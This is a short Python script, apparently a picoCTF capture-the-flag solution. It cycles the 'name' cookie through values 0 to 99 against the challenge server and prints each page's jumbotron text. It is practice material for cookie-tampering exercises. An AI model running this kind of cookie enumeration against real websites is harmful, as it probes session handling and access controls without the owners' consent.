import requests
from bs4 import BeautifulSoup
from time import sleep
URL = 'http://mercury.picoctf.net:54219/'
print(type(URL))
for i in range(100):
    cook = {
            'name':str(i)
            }
    
    print('testing {}'.format(str(i)))
    #print(qu.text)
    try:
        qu = requests.get(URL,cookies = cook)
        soup = BeautifulSoup(qu.text,'html.parser')
        print(soup.find_all('div',class_='jumbotron')[0].text)
    except:
        pass
   
